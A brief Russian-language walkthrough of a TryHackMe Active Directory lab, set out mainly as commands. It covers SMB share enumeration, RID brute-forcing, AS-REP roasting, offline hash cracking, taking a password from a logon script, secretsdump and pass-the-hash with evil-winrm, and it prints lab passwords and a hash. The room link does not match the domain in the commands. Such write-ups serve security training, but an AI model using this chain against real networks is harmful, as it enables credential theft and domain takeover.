https://tryhackme.com/room/fusioncorp

первым делом сканим

rustscan -a target_ip -- -sV --version-all --script=vuln -Pn -A -oA fusioncorp

видим порт 445 пробуем дефолт проверки
nxc smb target_ip

nxc smb target_ip -u '' -p '' --shares

nxc smb target_ip -u 'guest' -p '' --shares

обнаруживаем у пользователя guest права на чтение в необычных шарах, чекаем и выкачиваем содержимое командой mget *

smbclient //target_ip/VulnNet-Business-Anonymous -U 'guest' -N

mget *

smbclient //target_ip/VulnNet-Enterprise-Anonymous -U 'guest' -N

mget *

после смотрим что там
cat Bus*
cat Ent*
есть так сказать раскрытие информации имен сотрудников.. но точная запись домена нам не известна.

пробуем получить имена учеток
nxc smb target_ip -u 'guest' -p '' --rid-brute

Успешно, формируем файлик users.txt
Administrator
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet

Пробуем акаку AS-REP Roasting
impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -dc-ip target_ip -format hashcat -outputfile hashes.asreproast

получаем хеш
бежим разгадывать

john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes.asreproast
получаем валидную пару логин:пароль t-skid:tj072889*
tj072889* ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)

сразу проверяем находку nxc smb target_ip -u 't-skid' -p 'tj072889*' --shares

видим три новые доступные шары
smbclient //target_ip/IPC$ -U 't-skid' -p 'tj072889*' --пусто
smbclient //target_ip/NETLOGON -U 't-skid' -p 'tj072889*' - получили файлик ResetPassword.vbs - mget *
smbclient //target_ip/SYSVOL -U 't-skid' -p 'tj072889*'

из ResetPassword.vbs получили
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
бежим опять проверять найденное
nxc smb target_ip -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' --shares
узнаем что мы локальный админ!
бежим за первым флагом
evil-winrm -i target_ip -u a-whitehat -p 'bNdKVkjv3RR9ht'

Evil-WinRM PS C:\Users\Administrator\Desktop> cd C:\Users
Evil-WinRM PS C:\Users> ls
Evil-WinRM PS C:\Users\enterprise-core-vn\Desktop> type user.txt

для прочтения флага систем недостаточно прав.
чтож выкачиваем все секреты с локального админа
impacket-secretsdump 'vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@target_ip'

полученный хеш подставляем
evil-winrm -i target_ip -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
и получаем флаг
Evil-WinRM PS C:\Users\Administrator\Desktop> type system.txt
